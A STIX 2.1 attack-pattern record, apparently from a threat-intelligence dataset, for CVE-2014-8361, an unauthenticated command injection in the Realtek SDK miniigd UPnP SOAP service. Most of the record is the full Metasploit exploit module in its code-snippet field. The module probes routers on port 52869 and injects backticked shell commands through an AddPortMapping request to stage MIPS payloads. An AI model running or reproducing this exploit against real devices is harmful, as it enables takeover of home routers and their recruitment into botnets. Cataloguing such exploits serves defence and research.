{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--69ae9668-1399-43dc-9579-38690a151e6f",
    "created": "2024-08-14T17:02:03.971Z",
    "modified": "2024-08-14T17:02:03.971004Z",
    "name": "Realtek SDK Miniigd UPnP SOAP Command Execution",
    "description": " Different devices using the Realtek SDK with the miniigd daemon are vulnerable to OS command injection in the UPnP SOAP interface. Since it is a blind OS command injection vulnerability there is no output for the executed command. This module has been tested successfully on a Trendnet TEW-731BR router with emulation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/realtek_miniigd_upnp_exec_noauth.rb",
            "external_id": "realtek_miniigd_upnp_exec_noauth.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8361"
        },
        {
            "source_name": "reference",
            "url": "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Software-Development-KITchen-sink/ba-p/6745115#.VWVfsM_tmko"
        },
        {
            "source_name": "reference",
            "url": "http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10055"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Realtek SDK Miniigd UPnP SOAP Command Execution',\n      'Description' => %q{\n        Different devices using the Realtek SDK with the miniigd daemon are vulnerable to OS command\n        injection in the UPnP SOAP interface. Since it is a blind OS command injection vulnerability,\n        there is no output for the executed command. This module has been tested successfully on a\n        Trendnet TEW-731BR router with emulation.\n      },\n      'Author'      =>\n        [\n          'Ricky \"HeadlessZeke\" Lawshae', # Vulnerability discovery\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2014-8361'],\n          ['ZDI', '15-155'],\n          ['URL', 'http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Software-Development-KITchen-sink/ba-p/6745115#.VWVfsM_tmko'],\n          ['URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10055']\n        ],\n      'DisclosureDate' => '2015-04-24',\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets' =>\n        [\n          [ 'MIPS Little Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSLE\n            }\n          ],\n          [ 'MIPS Big Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSBE\n            }\n          ]\n        ],\n      'DefaultTarget'    => 0\n      ))\n\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n\n    register_options(\n      [\n        Opt::RPORT(52869) # port of UPnP SOAP webinterface\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => '/picsdesc.xml'\n      })\n      if res && [200, 301, 302].include?(res.code) && res.headers['Server'] =~ /miniupnpd\\/1.0 UPnP\\/1.0/\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Trying to access the device ...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable device\")\n    end\n\n    print_status(\"Exploiting...\")\n\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 50,\n      :nodelete => true\n    )\n  end\n\n  def execute_command(cmd, opts)\n    uri = '/wanipcn.xml'\n    soap_action = 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'\n    data_cmd = '<?xml version=\"1.0\"?>' + build_soap_req\n\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'vars_get' => {\n          'service' => 'WANIPConn1'\n        },\n        'ctype' => 'text/xml',\n        'method' => 'POST',\n        'headers' => {\n          'SOAPAction' => soap_action\n          },\n        'data' => data_cmd.gsub(/CMD_HERE/, \"`#{cmd.gsub(/\\\\/, '\\\\\\\\\\\\\\\\\\\\')}`\")\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def build_soap_req\n    new_external_port = rand(32767) + 32768\n    new_internal_port = rand(32767) + 32768\n\n    xml = Document.new\n\n    xml.add_element(\n      'SOAP-ENV:Envelope',\n      {\n        'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',\n        'SOAP-ENV:encodingStyle' => 'http://schemas.xmlsoap.org/soap/encoding/'\n      })\n\n    xml.root.add_element('SOAP-ENV:Body')\n\n    body = xml.root.elements[1]\n\n    body.add_element(\n      'm:AddPortMapping',\n      {\n        'xmlns:m' => 'urn:schemas-upnp-org:service:WANIPConnection:1'\n      })\n\n    port_mapping = body.elements[1]\n    port_mapping.add_element('NewLeaseDuration')\n    port_mapping.add_element('NewInternalClient')\n    port_mapping.add_element('NewEnabled')\n    port_mapping.add_element('NewExternalPort')\n    port_mapping.add_element('NewRemoteHost')\n    port_mapping.add_element('NewProtocol')\n    port_mapping.add_element('NewInternalPort')\n\n    port_mapping.elements['NewLeaseDuration'].text  = ''\n    port_mapping.elements['NewInternalClient'].text = 'CMD_HERE'\n    port_mapping.elements['NewEnabled'].text        = '1'\n    port_mapping.elements['NewExternalPort'].text   = \"#{new_external_port}\"\n    port_mapping.elements['NewRemoteHost'].text     = ''\n    port_mapping.elements['NewProtocol'].text       = 'TCP'\n    port_mapping.elements['NewInternalPort'].text   = \"#{new_internal_port}\"\n\n    xml.to_s\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}